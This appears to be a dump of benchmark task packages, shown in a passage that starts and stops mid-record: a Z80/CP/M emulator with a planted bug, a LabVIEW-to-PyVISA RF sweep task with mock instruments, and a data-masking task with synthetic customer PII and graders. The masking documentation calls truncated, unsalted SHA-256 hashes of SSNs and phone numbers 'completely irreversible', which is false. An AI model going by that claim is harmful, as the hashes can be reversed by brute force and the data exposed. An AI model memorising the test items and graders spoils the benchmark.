self.get_flag(self.FLAG_Z):\n                # BUG: Should sign-extend offset\n                self.registers['PC'] = (self.registers['PC'] + offset) & 0xFFFF\n                \n        # LD SP, nn\n        elif opcode == 0x31:\n            sp = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            self.registers['SP'] = sp\n            \n        # LD (nn), A\n        elif opcode == 0x32:\n            addr = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            self.write_byte(addr, self.registers['A'])\n            \n        # LD (HL), n\n        elif opcode == 0x36:\n            value = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.write_byte((self.registers['H'] << 8) | self.registers['L'], value)\n            \n        # LD A, (nn)\n        elif opcode == 0x3A:\n            addr = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            self.registers['A'] = self.read_byte(addr)\n            \n        # INC A\n        elif opcode == 0x3C:\n            self.registers['A'] = (self.registers['A'] + 1) & 0xFF\n            self.update_flags(self.registers['A'])\n            \n        # DEC A\n        elif opcode == 0x3D:\n            self.registers['A'] = (self.registers['A'] - 1) & 0xFF\n            self.update_flags(self.registers['A'], True)\n            \n        # LD A, n\n        elif opcode == 0x3E:\n            self.registers['A'] = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            \n        # HALT\n        elif opcode == 0x76:\n            self.halt = True\n            \n        # LD A, (HL)\n        elif opcode == 0x7E:\n            self.registers['A'] = self.read_byte((self.registers['H'] << 8) | self.registers['L'])\n            \n        # XOR A\n        elif opcode == 0xAF:\n            self.registers['A'] = 0\n            self.update_flags(0)\n            self.set_flag(self.FLAG_C, False)\n            self.set_flag(self.FLAG_H, False)\n            \n        # OR A  \n        elif opcode == 0xB7:\n            self.registers['A'] = self.registers['A'] | self.registers['A']\n            self.update_flags(self.registers['A'])\n            self.set_flag(self.FLAG_C, False)\n            self.set_flag(self.FLAG_H, False)\n            \n        # POP BC\n        elif opcode == 0xC1:\n            value = self.pop()\n            self.registers['B'] = (value >> 8) & 0xFF\n            self.registers['C'] = value & 0xFF\n            \n        # JP NZ, nn\n        elif opcode == 0xC2:\n            addr = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            if not self.get_flag(self.FLAG_Z):\n                self.registers['PC'] = addr\n                \n        # JP nn\n        elif opcode == 0xC3:\n            self.registers['PC'] = self.read_word(self.registers['PC'])\n            \n        # PUSH BC\n        elif opcode == 0xC5:\n            self.push((self.registers['B'] << 8) | self.registers['C'])\n            \n        # RET\n        elif opcode == 0xC9:\n            self.registers['PC'] = self.pop()\n            \n        # JP Z, nn\n        elif opcode == 0xCA:\n            addr = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            if self.get_flag(self.FLAG_Z):\n                self.registers['PC'] = addr\n                \n        # CALL nn\n        elif opcode == 0xCD:\n            addr = self.read_word(self.registers['PC'])\n            self.registers['PC'] += 2\n            self.push(self.registers['PC'])\n            self.registers['PC'] = addr\n            \n            # CP/M BDOS call\n            if addr == 0x0005:\n                self.handle_bdos()\n                \n        # POP DE\n        elif opcode == 0xD1:\n            value = self.pop()\n            self.registers['D'] = (value >> 8) & 0xFF\n            self.registers['E'] = value & 0xFF\n            \n        # OUT (n), A\n        elif opcode == 0xD3:\n            port = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.io[port] = self.registers['A']\n            \n        # PUSH DE\n        elif opcode == 0xD5:\n            self.push((self.registers['D'] << 8) | self.registers['E'])\n            \n        # IN A, (n)\n        elif opcode == 0xDB:\n            port = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.registers['A'] = self.io[port]\n            \n        # POP HL\n        elif opcode == 0xE1:\n            value = self.pop()\n            self.registers['H'] = (value >> 8) & 0xFF\n            self.registers['L'] = value & 0xFF\n            \n        # PUSH HL\n        elif opcode == 0xE5:\n            self.push((self.registers['H'] << 8) | self.registers['L'])\n            \n        # AND n\n        elif opcode == 0xE6:\n            value = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            self.registers['A'] &= value\n            self.update_flags(self.registers['A'])\n            self.set_flag(self.FLAG_C, False)\n            self.set_flag(self.FLAG_H, True)\n            \n        # POP AF\n        elif opcode == 0xF1:\n            value = self.pop()\n            self.registers['A'] = (value >> 8) & 0xFF\n            self.registers['F'] = value & 0xFF\n            \n        # DI\n        elif opcode == 0xF3:\n            self.iff1 = False\n            self.iff2 = False\n            \n        # PUSH AF\n        elif opcode == 0xF5:\n            self.push((self.registers['A'] << 8) | self.registers['F'])\n            \n        # EI\n        elif opcode == 0xFB:\n            self.iff1 = True\n            self.iff2 = True\n            \n        # CP n\n        elif opcode == 0xFE:\n            value = self.read_byte(self.registers['PC'])\n            self.registers['PC'] += 1\n            result = self.registers['A'] - value\n            self.update_flags(result & 0xFF, True)\n            self.set_flag(self.FLAG_C, result < 0)\n            \n        else:\n            print(f\""Unimplemented opcode: 0x{opcode:02X} at PC: 0x{self.registers['PC']-1:04X}\"")\n            self.halt = True\n            \n    def handle_bdos(self):\n        function_num = self.registers['C']\n        \n        # Console output\n        if function_num == 0x02:\n            char = self.registers['E']\n            self.console_output += chr(char)\n            print(chr(char), end='', flush=True)\n            \n        # Print string\n        elif function_num == 0x09:\n            addr = (self.registers['D'] << 8) | self.registers['E']\n            while True:\n                char = self.read_byte(addr)\n                if char == 0x24:  # '$' terminated\n                    break\n                self.console_output += chr(char)\n                print(chr(char), end='', flush=True)\n                addr += 1\n                \n        # Console input\n        elif function_num == 0x01:\n            # For testing, return Enter key\n            self.registers['A'] = 0x0D\n            \n        # Read console buffer\n        elif function_num == 0x0A:\n            # For testing, simulate empty input\n            buffer_addr = (self.registers['D'] << 8) | self.registers['E']\n            self.write_byte(buffer_addr + 1, 0)  # No characters read\n            \n        else:\n            # Return success for unimplemented functions\n            self.registers['A'] = 0\n            \n    def run(self, max_cycles=1000000):\n        cycles = 0\n        while not self.halt and cycles < max_cycles:\n            self.execute()\n            cycles += 1\n        return cycles\n\n\ndef load_cpm(cpu):\n    # Load minimal CP/M boot sector\n    import base64\n    boot_sector = base64.b64decode(\""EQAAAADzMf//IQAAwxYcGCcYJQMAAAADAAAAAwAAAAMAAEEyLjLGABgfRElSIEEgICAgICAgIENPTSAAIAAAAAAAAAAAAAAgABAAAA==\"")\n    cpu.load_memory(0x0000, boot_sector)\n    \n    # Set up BDOS jump at 0x0005\n    cpu.write_byte(0x0005, 0xC3)  # JP instruction\n    cpu.write_word(0x0006, 0x0005)  # Jump to self (our handler)\n    \n    # Load CCP (Console Command Processor)\n    ccp = base64.b64decode(\""Pj4RhtwJxgJBPsYCEcTcCcYCEwAAAEE+IAYACQYACQYACQYACQYACQYACQYACQYACQYACQYACQYACQYACA==\"")\n    cpu.load_memory(0xDC00, ccp)\n    \n    # Start execution at 0x0000 (boot sector)\n    cpu.registers['PC'] = 0x0000""}",2025-07-22T21:55:43.878998+00:00,2025-07-23T11:11:14.173488+00:00
draft_dp_3c918175,medium,draft_dp_3c918175,scientific-computing,Convert the LabVIEW RF measurement sequence to Python using PyVISA. The SCPI command log from the VI is in labview_trace.txt - make sure the Python version executes the same command sequence and outputs data in the same CSV format.,scientific-computing,python|automation|signal-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /measurement_project

# Install PyVISA and dependencies
RUN pip install pyvisa pyvisa-py numpy matplotlib pandas

# Copy project files
COPY labview_trace.txt /measurement_project/
COPY rf_measurement_template.py /measurement_project/
COPY mock_instruments.py /measurement_project/
COPY instrument_config.json /measurement_project/
COPY expected_output_format.csv /measurement_project/
COPY labview_project/ /measurement_project/labview_project/

# Set up mock instrument server to run in background
RUN chmod +x /measurement_project/mock_instruments.py

CMD [""/bin/bash""]","import os
import subprocess
import csv
import time
import threading

def test_measurement_script_executes_and_connects():
    """"""Test that the Python script connects to mock instruments and performs measurements""""""
    # Start mock instruments in background
    mock_proc = subprocess.Popen(['python3', '/measurement_project/mock_instruments.py'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # Give mock instruments time to start
    time.sleep(2)
    
    try:
        # Run the measurement script
        result = subprocess.run(['python3', '/measurement_project/rf_measurement.py'],
                              capture_output=True, text=True, timeout=30)
        
        # Check that script ran without errors
        assert result.returncode == 0, f""Script failed with return code {result.returncode}""
        
        # Check for expected output indicating successful measurement
        assert ""measurements complete"" in result.stdout.lower(), ""Script did not complete measurements""
        
    finally:
        # Stop mock instruments
        mock_proc.terminate()
        mock_proc.wait(timeout=5)

def test_output_csv_format_matches_expected():
    """"""Test that the output CSV file matches the expected format""""""
    output_file = '/measurement_project/rf_measurements.csv'
    
    # Check if output file exists
    assert os.path.exists(output_file), ""Output CSV file not created""
    
    # Read the output file
    with open(output_file, 'r') as f:
        reader = csv.DictReader(f)
        rows = list(reader)
    
    # Check we have the expected number of measurements
    assert len(rows) == 5, f""Expected 5 measurements, got {len(rows)}""
    
    # Check CSV has correct columns
    expected_columns = {'Frequency_Hz', 'Power_dBm', 'Timestamp'}
    assert set(rows[0].keys()) == expected_columns, ""CSV columns don't match expected format""
    
    # Check frequency values match expected sweep
    frequencies = [float(row['Frequency_Hz']) for row in rows]
    expected_freqs = [2.4e9, 2.425e9, 2.45e9, 2.475e9, 2.5e9]
    for i, (actual, expected) in enumerate(zip(frequencies, expected_freqs)):
        assert abs(actual - expected) < 1e3, f""Frequency {i} mismatch: {actual} vs {expected}""","{""test_measurement_script_executes_and_connects"": 0.6, ""test_output_csv_format_matches_expected"": 0.4}","{""instrument_config.json"": ""{\n    \""spectrum_analyzer\"": {\n        \""address\"": \""TCPIP0::localhost::5025::SOCKET\"",\n        \""timeout\"": 5000,\n        \""termination\"": \""\\n\""\n    },\n    \""signal_generator\"": {\n        \""address\"": \""TCPIP0::localhost::5026::SOCKET\"",\n        \""timeout\"": 5000,\n        \""termination\"": \""\\n\""\n    },\n    \""measurement_settings\"": {\n        \""frequencies\"": [2.4e9, 2.425e9, 2.45e9, 2.475e9, 2.5e9],\n        \""power_level\"": -10,\n        \""averaging_count\"": 10,\n        \""rbw\"": 100e3,\n        \""vbw\"": 10e3\n    }\n}"", ""rf_measurement_template.py"": ""#!/usr/bin/env python3\n\""\""\""\nRF Measurement Python Script\nConverted from LabVIEW VI\n\""\""\""\n\nimport pyvisa\nimport numpy as np\nimport time\nimport json\nimport csv\nfrom datetime import datetime\n\ndef main():\n    # Initialize VISA resource manager\n    rm = pyvisa.ResourceManager('@py')\n    \n    # Load configuration\n    with open('instrument_config.json', 'r') as f:\n        config = json.load(f)\n    \n    print(\""Starting RF measurements...\"")\n    \n    # Connect to instruments\n    \n    # Perform measurements\n    \n\nif __name__ == \""__main__\"":\n    main()"", ""mock_instruments.py"": ""#!/usr/bin/env python3\n\""\""\""\nMock VISA Instruments Server\nSimulates spectrum analyzer and signal generator responses\n\""\""\""\n\nimport socket\nimport threading\nimport time\nimport re\n\nclass MockInstrument:\n    def __init__(self, idn_response, port):\n        self.idn_response = idn_response\n        self.port = port\n        self.state = {}\n        self.server = None\n        \n    def handle_command(self, command):\n        cmd = command.strip().upper()\n        \n        if cmd == \""*IDN?\"":\n            return self.idn_response\n        elif cmd == \""*RST\"" or cmd == \""*CLS\"":\n            return \""\""\n        elif cmd == \""*OPC?\"":\n            time.sleep(1.0)  # Simulate measurement time\n            return \""1\""\n        else:\n            return self.handle_specific_command(cmd)\n    \n    def start_server(self):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.server.bind(('localhost', self.port))\n        self.server.listen(1)\n        \n        while True:\n            conn, addr = self.server.accept()\n            threading.Thread(target=self.handle_client, args=(conn,)).start()\n    \n    def handle_client(self, conn):\n        buffer = \""\""\n        while True:\n            try:\n                data = conn.recv(1024).decode()\n                if not data:\n                    break\n                    \n                buffer += data\n                while '\\n' in buffer:\n                    line, buffer = buffer.split('\\n', 1)\n                    response = self.handle_command(line)\n                    if response:\n                        conn.send((response + '\\n').encode())\n            except:\n                break\n        conn.close()\n\nclass MockSpectrumAnalyzer(MockInstrument):\n    def __init__(self):\n        super().__init__(\""Keysight,N9030B,MY12345678,A.01.23\"", 5025)\n        self.freq_center = 2.45e9\n        self.freq_span = 100e6\n        self.marker_results = {\n            2.4e9: -23.45,\n            2.425e9: -24.12,\n            2.45e9: -23.89,\n            2.475e9: -24.56,\n            2.5e9: -25.23\n        }\n        \n    def handle_specific_command(self, cmd):\n        if cmd.startswith(\"":SENS:FREQ:CENT\""):\n            self.freq_center = float(cmd.split()[-1])\n            return \""\""\n        elif cmd.startswith(\"":SENS:FREQ:SPAN\""):\n            self.freq_span = float(cmd.split()[-1])\n            return \""\""\n        elif cmd == \"":CALC:MARK1:Y?\"":\n            # Return power based on current signal generator frequency\n            freq = getattr(self, 'current_sig_gen_freq', 2.4e9)\n            return str(self.marker_results.get(freq, -25.0))\n        elif cmd == \"":CALC:MARK1:X?\"":\n            freq = getattr(self, 'current_sig_gen_freq', 2.4e9)\n            return f\""{freq:.1e}\""\n        elif cmd in [\"":BAND:RES\"", \"":BAND:VID\"", \"":TRAC:TYPE\"", \"":AVER:COUNT\"", \n                     \"":INIT:IMM\"", \"":CALC:MARK1:MAX\""]:\n            return \""\""\n        return \""\""\n\nclass MockSignalGenerator(MockInstrument):\n    def __init__(self, spectrum_analyzer):\n        super().__init__(\""Keysight,E8267D,MY23456789,B.02.34\"", 5026)\n        self.frequency = 2.4e9\n        self.power = -10\n        self.output = False\n        self.spectrum_analyzer = spectrum_analyzer\n        \n    def handle_specific_command(self, cmd):\n        if cmd.startswith(\"":FREQ\""):\n            self.frequency = float(cmd.split()[-1])\n            # Update spectrum analyzer's knowledge of signal gen frequency\n            self.spectrum_analyzer.current_sig_gen_freq = self.frequency\n            return \""\""\n        elif cmd.startswith(\"":POW\""):\n            self.power = float(cmd.split()[-1])\n            return \""\""\n        elif cmd == \"":OUTP ON\"":\n            self.output = True\n            return \""\""\n        elif cmd == \"":OUTP OFF\"":\n            self.output = False\n            return \""\""\n        return \""\""\n\ndef main():\n    # Start mock instruments\n    sa = MockSpectrumAnalyzer()\n    sg = MockSignalGenerator(sa)\n    \n    # Run servers in threads\n    sa_thread = threading.Thread(target=sa.start_server)\n    sg_thread = threading.Thread(target=sg.start_server)\n    \n    sa_thread.daemon = True\n    sg_thread.daemon = True\n    \n    sa_thread.start()\n    sg_thread.start()\n    \n    print(\""Mock instruments running on ports 5025 (SA) and 5026 (SG)\"")\n    print(\""Press Ctrl+C to stop\"")\n    \n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        print(\""\\nShutting down mock instruments\"")\n\nif __name__ == \""__main__\"":\n    main()"", ""labview_trace.txt"": ""# LabVIEW VISA Trace Log\n# Timestamp: 2024-03-15 14:23:45\n# VI: RF_Measurement_Sweep.vi\n\n[14:23:45.123] viOpen(TCPIP0::192.168.1.100::inst0::INSTR) -> Spectrum Analyzer\n[14:23:45.234] viWrite: \""*IDN?\""\n[14:23:45.345] viRead: \""Keysight,N9030B,MY12345678,A.01.23\""\n[14:23:45.456] viWrite: \""*RST\""\n[14:23:45.567] viWrite: \""*CLS\""\n[14:23:45.678] viWrite: \"":SENS:FREQ:CENT 2.45E9\""\n[14:23:45.789] viWrite: \"":SENS:FREQ:SPAN 100E6\""\n[14:23:45.890] viWrite: \"":BAND:RES 100E3\""\n[14:23:45.991] viWrite: \"":BAND:VID 10E3\""\n[14:23:46.092] viWrite: \"":TRAC:TYPE AVER\""\n[14:23:46.193] viWrite: \"":AVER:COUNT 10\""\n\n[14:23:46.294] viOpen(TCPIP0::192.168.1.101::inst0::INSTR) -> Signal Generator  \n[14:23:46.395] viWrite: \""*IDN?\""\n[14:23:46.496] viRead: \""Keysight,E8267D,MY23456789,B.02.34\""\n[14:23:46.597] viWrite: \""*RST\""\n[14:23:46.698] viWrite: \"":FREQ 2.4E9\""\n[14:23:46.799] viWrite: \"":POW -10\""\n[14:23:46.900] viWrite: \"":OUTP ON\""\n\n# Start frequency sweep measurements\n[14:23:47.001] viWrite: \"":INIT:IMM\""  # To Spectrum Analyzer\n[14:23:48.002] viWrite: \""*OPC?\""\n[14:23:48.103] viRead: \""1\""\n[14:23:48.204] viWrite: \"":CALC:MARK1:MAX\""\n[14:23:48.305] viWrite: \"":CALC:MARK1:Y?\""\n[14:23:48.406] viRead: \""-23.45\""\n[14:23:48.507] viWrite: \"":CALC:MARK1:X?\""\n[14:23:48.608] viRead: \""2.4E9\""\n\n# Continue sweep at next frequency\n[14:23:48.709] viWrite: \"":FREQ 2.425E9\""  # To Signal Generator\n[14:23:48.810] viWrite: \"":INIT:IMM\""  # To Spectrum Analyzer\n[14:23:49.811] viWrite: \""*OPC?\""\n[14:23:49.912] viRead: \""1\""\n[14:23:50.013] viWrite: \"":CALC:MARK1:MAX\""\n[14:23:50.114] viWrite: \"":CALC:MARK1:Y?\""\n[14:23:50.215] viRead: \""-24.12\""\n[14:23:50.316] viWrite: \"":CALC:MARK1:X?\""\n[14:23:50.417] viRead: \""2.425E9\""\n\n# Continue sweep at next frequency\n[14:23:50.518] viWrite: \"":FREQ 2.45E9\""  # To Signal Generator\n[14:23:50.619] viWrite: \"":INIT:IMM\""  # To Spectrum Analyzer\n[14:23:51.620] viWrite: \""*OPC?\""\n[14:23:51.721] viRead: \""1\""\n[14:23:51.822] viWrite: \"":CALC:MARK1:MAX\""\n[14:23:51.923] viWrite: \"":CALC:MARK1:Y?\""\n[14:23:52.024] viRead: \""-23.89\""\n[14:23:52.125] viWrite: \"":CALC:MARK1:X?\""\n[14:23:52.226] viRead: \""2.45E9\""\n\n# Continue sweep at next frequency\n[14:23:52.327] viWrite: \"":FREQ 2.475E9\""  # To Signal Generator\n[14:23:52.428] viWrite: \"":INIT:IMM\""  # To Spectrum Analyzer\n[14:23:53.429] viWrite: \""*OPC?\""\n[14:23:53.530] viRead: \""1\""\n[14:23:53.631] viWrite: \"":CALC:MARK1:MAX\""\n[14:23:53.732] viWrite: \"":CALC:MARK1:Y?\""\n[14:23:53.833] viRead: \""-24.56\""\n[14:23:53.934] viWrite: \"":CALC:MARK1:X?\""\n[14:23:54.035] viRead: \""2.475E9\""\n\n# Continue sweep at next frequency  \n[14:23:54.136] viWrite: \"":FREQ 2.5E9\""  # To Signal Generator\n[14:23:54.237] viWrite: \"":INIT:IMM\""  # To Spectrum Analyzer\n[14:23:55.238] viWrite: \""*OPC?\""\n[14:23:55.339] viRead: \""1\""\n[14:23:55.440] viWrite: \"":CALC:MARK1:MAX\""\n[14:23:55.541] viWrite: \"":CALC:MARK1:Y?\""\n[14:23:55.642] viRead: \""-25.23\""\n[14:23:55.743] viWrite: \"":CALC:MARK1:X?\""\n[14:23:55.844] viRead: \""2.5E9\""\n\n# Cleanup\n[14:23:55.945] viWrite: \"":OUTP OFF\""  # To Signal Generator\n[14:23:56.046] viClose()  # Signal Generator\n[14:23:56.147] viClose()  # Spectrum Analyzer"", ""expected_output_format.csv"": ""Frequency_Hz,Power_dBm,Timestamp\n2400000000.0,-23.45,2024-03-15 14:23:48\n2425000000.0,-24.12,2024-03-15 14:23:50\n2450000000.0,-23.89,2024-03-15 14:23:52\n2475000000.0,-24.56,2024-03-15 14:23:53\n2500000000.0,-25.23,2024-03-15 14:23:55"", ""labview_project/RF_Measurement_Sweep.lvproj"": ""<?xml version='1.0' encoding='UTF-8'?>\n<Project Type=\""Project\"" LVVersion=\""20008000\"">\n    <Property Name=\""NI.Project.Description\"" Type=\""Str\"">RF Measurement Automation Project</Property>\n    <Item Name=\""My Computer\"" Type=\""My Computer\"">\n        <Property Name=\""server.app.propertiesEnabled\"" Type=\""Bool\"">true</Property>\n        <Item Name=\""RF_Measurement_Sweep.vi\"" Type=\""VI\"" URL=\""../RF_Measurement_Sweep.vi\""/>\n        <Item Name=\""Dependencies\"" Type=\""Dependencies\""/>\n    </Item>\n</Project>""}",2025-07-22T21:59:34.318374+00:00,2025-07-23T11:10:30.341737+00:00
draft_dp_06a4979c,medium,draft_dp_06a4979c,security,The queries/ directory has CSVs with sensitive customer data. Use the data-mask tool to mask them with the most secure algorithm. Put results in masked_queries/.,security,python|data-processing|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install pandas for CSV processing
RUN pip install pandas

# Create directory structure
RUN mkdir -p /app/queries /app/masked_queries

# Copy the data-mask tool and make it executable
COPY data-mask /usr/local/bin/
RUN chmod +x /usr/local/bin/data-mask

# Copy CSV files with sensitive data
COPY customers_export.csv /app/queries/
COPY orders_2024.csv /app/queries/
COPY user_profiles.csv /app/queries/

# Copy tool documentation
COPY data-mask-docs.txt /app/","import os
import csv
import re

def test_masked_files_created():
    """"""Test that all CSV files were processed and masked versions created.""""""
    # Check that masked_queries directory exists
    assert os.path.exists('/app/masked_queries'), ""masked_queries directory not found""
    
    # Check that all three CSV files have masked versions
    expected_files = ['customers_export.csv', 'orders_2024.csv', 'user_profiles.csv']
    for filename in expected_files:
        masked_path = f'/app/masked_queries/{filename}'
        assert os.path.exists(masked_path), f""Masked file {filename} not found""
        
        # Verify file has content
        with open(masked_path, 'r') as f:
            reader = csv.reader(f)
            rows = list(reader)
            assert len(rows) > 1, f""Masked file {filename} is empty or only has headers""

def test_secure_algorithm_used():
    """"""Test that the most secure algorithm (hash-sha256) was used for masking.""""""
    # Read a masked file to check the format
    with open('/app/masked_queries/customers_export.csv', 'r') as f:
        reader = csv.DictReader(f)
        first_row = next(reader)
        
        # Check email field - should be 16-char hex string if SHA-256 was used
        email_value = first_row.get('email', '')
        assert len(email_value) == 16, f""Email not properly hashed (length: {len(email_value)})""
        assert re.match(r'^[a-f0-9]{16}$', email_value), ""Email not in SHA-256 hex format""
        
        # Check SSN field - should also be 16-char hex string
        ssn_value = first_row.get('ssn', '')
        assert len(ssn_value) == 16, f""SSN not properly hashed (length: {len(ssn_value)})""
        assert re.match(r'^[a-f0-9]{16}$', ssn_value), ""SSN not in SHA-256 hex format""
        
        # Verify it's not format-preserving (would have X's and dashes)
        assert 'X' not in email_value, ""Format-preserving algorithm used instead of secure hash""
        assert '-' not in ssn_value, ""Format-preserving pattern found in SSN""","{""test_masked_files_created"": 0.3, ""test_secure_algorithm_used"": 0.7}","{""orders_2024.csv"": ""order_id,customer_name,customer_email,shipping_address,order_total,order_date\n5001,John Smith,john.smith@email.com,123 Main St Apt 4B,299.99,2024-03-15\n5002,Sarah Johnson,sarah.j@gmail.com,456 Oak Ave,149.50,2024-03-16\n5003,Michael Brown,mbrown@yahoo.com,789 Pine Rd Unit 2,450.00,2024-03-17\n5004,Emily Davis,emily.davis@hotmail.com,321 Elm Street,89.99,2024-03-18\n5005,Robert Wilson,rwilson@email.com,654 Maple Drive,325.75,2024-03-19\n5006,Jennifer Lee,jlee@gmail.com,987 Cedar Blvd,199.00,2024-03-20\n5007,David Martinez,david.m@email.com,159 Birch Lane,675.25,2024-03-21\n5008,Lisa Anderson,landerson@yahoo.com,753 Spruce Way,125.00,2024-03-22"", ""data-mask-docs.txt"": ""DATA-MASK TOOL DOCUMENTATION\n============================\n\nSYNOPSIS\n--------\ndata-mask [OPTIONS] input_file output_file\n\nDESCRIPTION\n-----------\nThe data-mask tool provides various algorithms for masking sensitive data in CSV files.\nIt automatically detects common sensitive columns (names, emails, phones, SSNs) or you\ncan specify columns manually.\n\nOPTIONS\n-------\n--algorithm ALGO    Masking algorithm to use (default: format-preserving)\n--columns COL1 COL2 Specific columns to mask (default: auto-detect)\n--help-algorithms   Show detailed algorithm security information\n\nALGORITHMS\n----------\nAvailable algorithms listed from LEAST to MOST secure:\n\n1. format-preserving\n   - Replaces characters with 'X' while keeping format\n   - Example: john@email.com -> XXXX@email.com\n   - Security: LOW - Format reveals data type, patterns visible\n\n2. tokenization\n   - Replaces with consistent tokens\n   - Example: john@email.com -> TOK_384729\n   - Security: MEDIUM - Non-reversible but tokens are consistent\n\n3. hash-md5\n   - MD5 one-way hash (truncated to 16 chars)\n   - Example: john@email.com -> a94a8fe5ccb19ba6\n   - Security: MEDIUM - Older algorithm with known vulnerabilities\n\n4. hash-sha1\n   - SHA-1 one-way hash (truncated to 16 chars)\n   - Example: john@email.com -> 7c4a8d09ca3762af\n   - Security: MEDIUM-HIGH - Better than MD5\n\n5. hash-sha256 (MOST SECURE)\n   - SHA-256 one-way hash (truncated to 16 chars)\n   - Example: john@email.com -> e3b0c44298fc1c14\n   - Security: HIGHEST - Cryptographically secure, completely irreversible\n   - RECOMMENDED for maximum security with data utility\n\nSECURITY RECOMMENDATIONS\n------------------------\nFor compliance and maximum security, use hash-sha256. It provides:\n- Complete irreversibility (original data cannot be recovered)\n- No pattern leakage (all outputs look uniformly random)\n- Consistent masking (same input always produces same output)\n- Industry-standard cryptographic security\n\nEXAMPLES\n--------\n# Auto-detect sensitive columns, use default algorithm\ndata-mask customers.csv masked_customers.csv\n\n# Use most secure algorithm (recommended)\ndata-mask --algorithm hash-sha256 customers.csv masked_customers.csv\n\n# Mask specific columns only\ndata-mask --algorithm hash-sha256 --columns email ssn data.csv masked_data.csv\n\n# See algorithm details\ndata-mask --help-algorithms"", ""customers_export.csv"": ""customer_id,full_name,email,phone_number,ssn,registration_date\n1001,John Smith,john.smith@email.com,555-123-4567,123-45-6789,2024-01-15\n1002,Sarah Johnson,sarah.j@gmail.com,555-234-5678,234-56-7890,2024-01-20\n1003,Michael Brown,mbrown@yahoo.com,555-345-6789,345-67-8901,2024-02-01\n1004,Emily Davis,emily.davis@hotmail.com,555-456-7890,456-78-9012,2024-02-10\n1005,Robert Wilson,rwilson@email.com,555-567-8901,567-89-0123,2024-02-15\n1006,Jennifer Lee,jlee@gmail.com,555-678-9012,678-90-1234,2024-03-01\n1007,David Martinez,david.m@email.com,555-789-0123,789-01-2345,2024-03-05\n1008,Lisa Anderson,landerson@yahoo.com,555-890-1234,890-12-3456,2024-03-10"", ""user_profiles.csv"": ""user_id,username,personal_email,date_of_birth,home_phone,mobile_phone\n2001,jsmith2024,john.smith@email.com,1985-06-15,555-123-4567,555-123-9999\n2002,sarahj,sarah.j@gmail.com,1990-09-22,555-234-5678,555-234-8888\n2003,mikebrown,mbrown@yahoo.com,1978-03-10,555-345-6789,555-345-7777\n2004,emilyd,emily.davis@hotmail.com,1995-12-05,555-456-7890,555-456-6666\n2005,robwilson,rwilson@email.com,1982-07-18,555-567-8901,555-567-5555\n2006,jenny_lee,jlee@gmail.com,1988-11-30,555-678-9012,555-678-4444\n2007,dmartinez,david.m@email.com,1975-04-25,555-789-0123,555-789-3333\n2008,lisa_a,landerson@yahoo.com,1993-08-14,555-890-1234,555-890-2222"", ""data-mask"": ""#!/usr/bin/env python3\nimport sys\nimport csv\nimport hashlib\nimport re\nimport argparse\nfrom pathlib import Path\n\ndef format_preserving_mask(value, pattern='X'):\n    \""\""\""Preserve format but replace characters\""\""\""\n    if '@' in str(value):  # Email\n        user, domain = str(value).split('@')\n        return f\""{pattern * len(user)}@{domain}\""\n    elif re.match(r'^\\d{3}-\\d{3}-\\d{4}$', str(value)):  # Phone\n        return f\""{pattern * 3}-{pattern * 3}-{pattern * 4}\""\n    elif re.match(r'^\\d{3}-\\d{2}-\\d{4}$', str(value)):  # SSN\n        return f\""{pattern * 3}-{pattern * 2}-{pattern * 4}\""\n    else:\n        return pattern * len(str(value))\n\ndef tokenize_mask(value, token_prefix='TOK'):\n    \""\""\""Replace with tokens\""\""\""\n    return f\""{token_prefix}_{abs(hash(str(value))) % 1000000:06d}\""\n\ndef hash_mask(value, algorithm='sha256'):\n    \""\""\""One-way hash masking\""\""\""\n    if algorithm == 'sha256':\n        return hashlib.sha256(str(value).encode()).hexdigest()[:16]\n    elif algorithm == 'md5':\n        return hashlib.md5(str(value).encode()).hexdigest()[:16]\n    else:\n        return hashlib.sha1(str(value).encode()).hexdigest()[:16]\n\ndef main():\n    parser = argparse.ArgumentParser(description='Data masking tool for sensitive information')\n    parser.add_argument('input_file', help='Input CSV file')\n    parser.add_argument('output_file', help='Output CSV file')\n    parser.add_argument('--algorithm', choices=['format-preserving', 'tokenization', 'hash-sha256', 'hash-md5', 'hash-sha1'],\n                        default='format-preserving', help='Masking algorithm to use')\n    parser.add_argument('--columns', nargs='+', help='Columns to mask (default: auto-detect sensitive columns)')\n    parser.add_argument('--help-algorithms', action='store_true', help='Show detailed algorithm descriptions')\n    \n    args = parser.parse_args()\n    \n    if args.help_algorithms:\n        print(\""\""\""\nData Masking Algorithms:\n\n1. format-preserving: Replaces characters with 'X' while preserving format\n   - Emails: XXX@domain.com\n   - Phones: XXX-XXX-XXXX\n   - SSNs: XXX-XX-XXXX\n   - Security: LOW - Format reveals data type, reversible patterns\n\n2. tokenization: Replaces values with tokens (TOK_123456)\n   - All values become: TOK_XXXXXX\n   - Security: MEDIUM - Non-reversible but consistent tokens\n\n3. hash-sha256: One-way SHA-256 hash (most secure)\n   - All values become: 16-char hex strings\n   - Security: HIGHEST - Cryptographically secure, irreversible\n   - Best for maximum security with data utility\n\n4. hash-md5: One-way MD5 hash\n   - All values become: 16-char hex strings\n   - Security: MEDIUM - Older algorithm, some vulnerabilities\n\n5. hash-sha1: One-way SHA-1 hash\n   - All values become: 16-char hex strings\n   - Security: MEDIUM-HIGH - Better than MD5, not as secure as SHA-256\n\""\""\"")\n        sys.exit(0)\n    \n    # Sensitive column patterns\n    sensitive_patterns = ['name', 'email', 'phone', 'ssn', 'address', 'dob', 'birth']\n    \n    with open(args.input_file, 'r') as infile, open(args.output_file, 'w', newline='') as outfile:\n        reader = csv.DictReader(infile)\n        fieldnames = reader.fieldnames\n        \n        # Auto-detect sensitive columns if not specified\n        if not 